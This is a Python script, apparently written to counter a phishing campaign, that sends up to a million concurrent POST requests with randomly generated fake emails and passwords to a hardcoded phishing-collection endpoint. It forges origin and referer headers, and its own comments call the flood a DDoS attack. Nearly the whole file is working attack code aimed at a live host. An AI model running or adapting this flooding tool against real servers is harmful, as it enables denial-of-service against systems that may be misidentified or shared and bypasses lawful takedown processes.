import random
import string
import asyncio
from typing import List

import aiohttp
import time
from tqdm import tqdm

# post site url
host_url = "https://lsddmovies.xyz/mortal.php"

# Phising site url
phising_url = "https://8kxmx.codesandbox.io"

# a-z A-Z define
ascii_letters = string.ascii_letters

# 0 - 9 number define
numbers = string.digits

# domain define
domain = ["com", "net", "am", "in", "cn", "sg", "ph", "my", "ws", "tw", "ca", "gd", "tc", "us", "vg", "at", "me", "be"]

# punctuation define
punctuation = string.punctuation

# header define
header = {
    "origin": phising_url,
    "referer": phising_url,
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
}

def create_random_string(pool: List[str], size: int) -> str:
    """
    create random string
    :param pool: ["a", "b", ...]
    :param size: return size
    :return:
    """
    result = ""
    for i in range(size):
        result += random.choice(pool)
    return result


def create_random_email() -> str:
    """
    generate random email
    :return: {random length a-z A-Z}{random length  0-9} @ {random length  a-z A-Z} . {random domain}
    """
    choice_domain = random.choice(domain)
    random_size = random.randint(3, 15)
    number_size = random.randint(0, 5)
    server_name_size = random.randint(5, 7)
    return f"{create_random_string(ascii_letters, random_size)}" \
           f"{create_random_string(numbers, number_size)}" \
           f"@{create_random_string(ascii_letters, server_name_size)}.{choice_domain}"


def create_random_password() -> str:
    """
    create random password
    :return: {random length a-z A-Z}{random length  0-9}{random length punctuation}
    """
    random_size = random.randint(3, 15)
    number_size = random.randint(0, 5)
    punctuation_size = random.randint(1, 3)
    return f"{create_random_string(ascii_letters, random_size)}" \
           f"{create_random_string(numbers, number_size)}" \
           f"{create_random_string(punctuation, punctuation_size)}"


async def fetch(url: str, session: aiohttp.ClientSession) -> None:
    """
    fetch to do attack
    :param url: attack url
    :param session: session
    :return: None
    """
    email = create_random_email()
    password = create_random_password()
    post_data = {
        "aid": 1,
        "email": email,
        "pass": password
    }
    try:
        async with session.post(url, json=post_data) as response:
            print(f"POST | [{time.strftime('%c', time.localtime(time.time()))}] | E-MAIL : {email} | "
                  f"PASSWORD : {password} | {response.reason}")
    except:
        return

async def bound_fetch(sem: asyncio.Semaphore, url: str, session: aiohttp.ClientSession):
    """
    bound fetch
    :param sem:
    :param url:
    :param session:
    :return:
    """
    async with sem:
        await fetch(url, session)


async def run(attack_times: int) -> None:
    """
    do attack
    :param attack_times: DDos time
    :return: None
    """
    tasks = []
    sem = asyncio.Semaphore(500)
    async with aiohttp.ClientSession() as session:
        tf = input(f"Attack to {host_url} ? [Y/n] : ")
        if tf.lower() == "y":
            for i in tqdm(range(attack_times), "Ready To Attack "):
                task = asyncio.ensure_future(bound_fetch(sem, host_url, session))
                tasks.append(task)

            tf = input(f"Attack preparation is complete. Do you want to start? [Y/n] : ")
            if tf.lower() == "y":
                responses = asyncio.gather(*tasks)
                await responses
            else:
                print("Terminated by user.")
        else:
            print("Terminated by user.")

if __name__ == '__main__':
    r = 1_000_000
    loop = asyncio.get_event_loop()
    future = asyncio.ensure_future(run(r))
    start = time.time()
    loop.run_until_complete(future)
    end = time.time()
    print(f"DONE | {round(end - start, 2)} sec")